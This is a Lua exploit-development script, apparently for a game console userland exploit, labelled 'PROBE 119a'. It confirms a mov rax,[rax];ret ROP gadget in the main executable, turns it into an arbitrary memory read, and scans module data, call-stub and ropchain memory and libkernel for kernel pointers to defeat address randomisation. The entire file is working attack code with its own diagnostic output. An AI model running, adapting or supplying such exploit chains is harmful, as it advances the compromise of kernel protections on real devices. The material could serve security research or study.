-- CRASH_CLASS: LOW
-- PROBE 119a: Arbitrary read via mov rax,[rax];ret gadget
--
-- The pipe ropchain shows: mov rax,[rax];ret at eboot+0x1EEBB
-- native.fcall_with_rax(gadget, target, 0) → RAX=target → mov rax,[rax] → ret
-- Returns the qword at target address.
--
-- Plan:
-- A: Verify gadget bytes and test with known values
-- B: Compare with memory.read_qword for precision analysis
-- C: Scan all module data segments for kernel pointers
-- D: Scan pipe/ropchain internals for kernel pointers
-- E: Scan around syscall.syscall_address (libkernel)

print("=== PROBE 119a: RAX ARBITRARY READ ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200)
wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local EB = N(uint64(string.format("0x%X%08X",ehi,elo)))
print(string.format("eboot=0x%X%08X", ehi, elo))

-- mov rax,[rax];ret gadget
local GRAX = EB + 0x1EEBB

-- ============================================================
print("")
print("--- A: VERIFY GADGET BYTES ---")
-- Check bytes at eboot+0x1EEBB: should be 48 8B 00 C3
local b0 = rd(EB + 0x1EEBB) -- reads 4 bytes: should be 0xC3008B48
local uv = b0
if b0 and b0<0 then uv=b0+0x100000000 end
print(string.format("  eboot+0x1EEBB dword: 0x%X (expect 0xC3008B48)", uv or 0))
if uv == 0xC3008B48 then
    print("  *** GADGET BYTES CONFIRMED: mov rax,[rax]; ret ***")
else
    print("  WARNING: unexpected bytes!")
    -- Try reading the ropchain to find the actual gadget
    local pipe_str = tostring(syscall.pipe)
    local rax_gad = pipe_str:match("(0x[0-9a-fA-F]+)%s*;%s*mov rax, %[rax%]; ret")
    if rax_gad then
        print("  pipe_str has mov rax,[rax] at: " .. rax_gad)
        GRAX = tonumber(rax_gad) or GRAX
    end
end

-- ============================================================
print("")
print("--- B: TEST WITH KNOWN VALUES ---")

-- Test 1: read from eboot base
local m1 = rq(EB)
local ok1, g1 = pcall(function() return native.fcall_with_rax(GRAX, EB, 0) end)
print(string.format("  memory.rq(eboot): %s", fmt_ptr(m1)))
print(string.format("  gadget(eboot):    %s", ok1 and fmt_ptr(g1) or "FAIL"))

-- Test 2: read from a known test buffer (use string-based uint64 for precision)
local tbuf = memory.alloc(32)
wq(N(tbuf)+0, uint64("0xCAFEBABE12345678"))
wq(N(tbuf)+8, uint64("0xDEADBEEF87654321"))
local TB = N(tbuf)

local m2 = rq(TB)
local ok2, g2 = pcall(function() return native.fcall_with_rax(GRAX, TB, 0) end)
print(string.format("  memory.rq(tbuf):  %s", fmt_ptr(m2)))
print(string.format("  gadget(tbuf):     %s", ok2 and fmt_ptr(g2) or "FAIL"))

local m3 = rq(TB+8)
local ok3, g3 = pcall(function() return native.fcall_with_rax(GRAX, TB+8, 0) end)
print(string.format("  memory.rq(tbuf+8):%s", fmt_ptr(m3)))
print(string.format("  gadget(tbuf+8):   %s", ok3 and fmt_ptr(g3) or "FAIL"))

-- Check match
local match1 = (fmt_ptr(m1) == fmt_ptr(g1))
local match2 = (fmt_ptr(m2) == fmt_ptr(g2))
local match3 = (fmt_ptr(m3) == fmt_ptr(g3))
print(string.format("  match: eboot=%s tbuf=%s tbuf+8=%s", tostring(match1), tostring(match2), tostring(match3)))
if match1 and match2 and match3 then
    print("  *** ALL MATCHES — PERFECT ARBITRARY READ ***")
elseif match1 or match2 or match3 then
    print("  partial match — gadget works but has precision issues")
end

local c = N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- Define arb_read helper
local function arb_read(addr)
    local ok, val = pcall(function()
        return native.fcall_with_rax(GRAX, addr, 0)
    end)
    if ok then return val end
    return nil
end

-- ============================================================
print("")
print("--- C: SCAN ALL MODULE DATA SEGMENTS ---")
-- Get module info for handles 0-10
local sc_info = mk(593)
local total_kp = 0

for handle=0,10 do
    wd(inf,0x160)
    local oki = pcall(function() sc_info(uint64(handle), inf) end)
    if not oki then break end
    local tl=rd(inf+0x108) or 0; local th=rd(inf+0x10C) or 0
    if th<0 then th=th+0x100000000 end
    if tl<0 then tl=tl+0x100000000 end
    if th==0 and tl==0 then
        if handle > 2 then break end
    else
        local mod_base = N(uint64(string.format("0x%X%08X", th, tl)))
        print(string.format("  mod %d text=0x%X%08X", handle, th, tl))

        -- Scan at intervals: +2MB, +3MB, +4MB, +5MB (probable data segments)
        for _, offMB in ipairs({2,3,4,5,6}) do
            local scan_base = mod_base + offMB*0x100000
            local first = arb_read(scan_base)
            if first == nil then
                -- unreadable, skip
            else
                local kp = 0
                for off=0,0x8000-8,8 do
                    local val = arb_read(scan_base + off)
                    if val == nil then break end
                    if is_kptr(val) then
                        kp = kp + 1
                        total_kp = total_kp + 1
                        print(string.format("    *** KPTR mod%d +0x%X: %s ***",
                            handle, offMB*0x100000+off, fmt_ptr(val)))
                        if total_kp >= 20 then break end
                    end
                end
            end
            if total_kp >= 20 then break end
        end
    end
    if total_kp >= 20 then break end
end
print(string.format("  total module data kptrs: %d", total_kp))

c = N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- ============================================================
print("")
print("--- D: SCAN PIPE/ROPCHAIN INTERNALS ---")
local pipe_str = tostring(syscall.pipe)
-- Extract key addresses
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local addr_str = pipe_str:match("address @ (0x[0-9a-fA-F]+)")
print(string.format("  fn_addr=%s rop=%s addr=%s", fn_addr_str or "nil", rop_str or "nil", addr_str or "nil"))

-- Scan around fn_addr (the actual call stub structure)
if fn_addr_str then
    local FA = tonumber(fn_addr_str)
    if FA then
        local kp = 0
        -- Scan 2KB before and after fn_addr
        for off=-0x400,0x800,8 do
            local val = arb_read(FA + off)
            if val and is_kptr(val) then
                kp = kp + 1
                print(string.format("    *** KPTR fn+0x%X: %s ***", off, fmt_ptr(val)))
            end
        end
        print(string.format("  fn_addr vicinity: %d kptrs", kp))
    end
end

-- Scan the "address" (pipe object itself?)
if addr_str then
    local PA = tonumber(addr_str)
    if PA then
        local kp = 0
        for off=-0x100,0x200,8 do
            local val = arb_read(PA + off)
            if val and is_kptr(val) then
                kp = kp + 1
                print(string.format("    *** KPTR pipe+0x%X: %s ***", off, fmt_ptr(val)))
            end
        end
        print(string.format("  pipe addr vicinity: %d kptrs", kp))
    end
end

c = N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- ============================================================
print("")
print("--- E: SCAN libkernel DATA AREA ---")
-- syscall.syscall_address is in libkernel .text
-- libkernel data is after its text
local SA = N(syscall.syscall_address)
print(string.format("  syscall_address=0x%X", SA))

-- Scan 2KB around SA (should be in .text, but check for data nearby)
local sa_kp = 0
for off=-0x200,0x200,8 do
    local val = arb_read(SA + off)
    if val and is_kptr(val) then
        sa_kp = sa_kp + 1
        print(string.format("    *** KPTR SA+0x%X: %s ***", off, fmt_ptr(val)))
    end
end
print(string.format("  SA vicinity: %d kptrs", sa_kp))

-- Get libkernel base via dynlib_get_info handle 1
wd(inf,0x160)
pcall(function() sc_info(uint64(1), inf) end)
local lkl=rd(inf+0x108) or 0; local lkh=rd(inf+0x10C) or 0
if lkh<0 then lkh=lkh+0x100000000 end
if lkl<0 then lkl=lkl+0x100000000 end
if lkh > 0 or lkl > 0 then
    local LK = N(uint64(string.format("0x%X%08X", lkh, lkl)))
    print(string.format("  libkernel text=0x%X%08X", lkh, lkl))
    -- Scan libkernel data: try +128KB to +512KB past text base
    local lk_kp = 0
    for off_kb=128,512,64 do
        local base = LK + off_kb*1024
        local first = arb_read(base)
        if first ~= nil then
            for off=0,0x2000-8,8 do
                local val = arb_read(base + off)
                if val==nil then break end
                if is_kptr(val) then
                    lk_kp = lk_kp + 1
                    print(string.format("    *** KPTR libkernel+0x%XK+0x%X: %s ***",
                        off_kb, off, fmt_ptr(val)))
                    if lk_kp >= 10 then break end
                end
            end
        end
        if lk_kp >= 10 then break end
    end
    print(string.format("  libkernel data: %d kptrs", lk_kp))
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 119a COMPLETE ===")
